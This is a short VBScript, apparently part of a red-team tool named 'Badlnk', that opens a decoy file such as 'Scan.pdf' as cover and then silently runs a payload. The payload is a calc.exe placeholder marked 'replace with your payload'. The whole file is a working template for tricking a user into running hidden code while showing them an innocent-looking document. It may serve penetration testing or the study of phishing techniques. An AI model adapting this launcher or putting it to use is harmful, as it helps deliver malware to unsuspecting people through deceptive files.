' Badlnk run vbscript
' Mike Rich, 2019 @miketofet

' Set up
' Get the target
Set colArgs = WScript.Arguments.Named
target = colArgs.Item("sttgt")

' Open the target as 'cover'
' This only works for registered file types
' Build this dynamically
' Remember your backslashes!
Select case target
case "0001"
CreateObject("WScript.Shell").Run """backup\Scan.pdf""", 0, False
case "0002"
CreateObject("WScript.Shell").Run """backup\test2.txt""", 0, False
case "0003"
CreateObject("WScript.Shell").Run """backup\test3.jpg""", 0, False
End Select

' Run the payload (replace with your payload)
CreateObject("WScript.Shell").Run "calc.exe", 0, False
